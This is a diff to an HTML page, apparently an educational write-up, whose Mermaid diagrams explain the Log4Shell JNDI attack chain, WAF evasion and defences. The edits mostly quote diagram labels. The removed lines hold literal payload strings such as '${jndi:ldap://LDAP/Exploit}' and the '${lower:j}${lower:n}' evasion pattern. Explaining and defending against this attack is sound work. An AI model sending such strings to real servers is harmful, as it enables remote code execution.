@@ -91,18 +91,18 @@ timeline
                 </ul>
                 <pre class="mermaid">
 graph LR
-    A((Attacker)) -->|"${jndi:}"| B[Vulnerable App]
+    A((Attacker)) -->|jndi lookup| B[Vulnerable App]
     B -->|LDAP query| C[Marshalsec]
     C -->|HTTP redirect| D[Payload Server]
     D --> B
                 </pre>
                 <pre class="mermaid">
 flowchart LR
-  App[App Logs Untrusted Data] --> JNDI{Message Lookup}
+  App["App Logs Untrusted Data"] --> JNDI{"Message Lookup"}
   JNDI -->|LDAP| Marshalsec
-  Marshalsec -->|http ref| HTTP[Payload Host]
-  HTTP --> Bytecode[Return .class]
-  Bytecode --> Exec[Execute in JVM]
+  Marshalsec -->|http ref| HTTP["Payload Host"]
+  HTTP --> Bytecode["Return .class"]
+  Bytecode --> Exec["Execute in JVM"]
                 </pre>
             </div>
 
@@ -121,25 +121,26 @@ sequenceDiagram
     participant Server
     participant LDAP
     participant HTTP
-    Attacker->>Server: ${jndi:ldap://LDAP/Exploit}
+    Attacker->>Server: jndi:ldap://LDAP/Exploit
     Server->>LDAP: Lookup
     LDAP-->>Server: Reference http://HTTP/ExploitPayload.class
     Server->>HTTP: Fetch class
     Server-->>Server: Run payload
                 </pre>
                 <pre class="mermaid">
-flowchart LR
-  subgraph Evasion Surface
-    L[lower:j substrings]
-    U[Unicode escapes]
-    S[split/concat]
-    Sch[alternate schemas]
-  end
-  Payload[${jndi:...}] --> Evasion Surface
-  Evasion Surface --> Lookup[JNDI Lookup]
-  Lookup --> Outcome{Exploit?}
-  Outcome -->|blocked| Detect[Normalization/WAF]
-  Outcome -->|allowed| Chain[LDAP->HTTP->Exec]
+                flowchart LR
+                subgraph Evasion_Surface
+                  ES["Evasion Surface"]
+                  L[lower:j substrings]
+                  U[Unicode escapes]
+                  S[split/concat]
+                  Sch[alternate schemas]
+                end
+                Payload["JNDI payload sample"] --> ES
+                ES --> Lookup["JNDI Lookup"]
+                Lookup --> Outcome{"Exploit?"}
+                Outcome -->|blocked| Detect["Normalization/WAF"]
+                Outcome -->|allowed| Chain["LDAP->HTTP->Exec"]
                 </pre>
             </div>
 
@@ -164,7 +165,7 @@ sequenceDiagram
   participant Client
   participant WAF
   participant App
-  Client->>WAF: ${lower:j}${lower:n}...
+  Client->>WAF: lower() composition (j, n, ...)
   WAF-->>Client: Allow (no normalization)
   App->>App: Normalizes/Resolves
   App->>LDAP: Outbound Lookup
@@ -208,10 +209,10 @@ graph TD
                 </pre>
                 <pre class="mermaid">
 flowchart TD
-  Normalize[Normalize Lookup Strings] --> Match[Signature/Regex Rules]
-  Match --> Block[Block/Alert]
-  EgressCtl[Outbound Egress Control] --> Block
-  PatchHardening[Patch & Harden] --> Reduce[Reduce Attack Surface]
+  Normalize["Normalize Lookup Strings"] --> Match["Signature/Regex Rules"]
+  Match --> Block["Block/Alert"]
+  EgressCtl["Outbound Egress Control"] --> Block
+  PatchHardening["Patch & Harden"] --> Reduce["Reduce Attack Surface"]
   Block --> Reduce
                 </pre>
             </div>
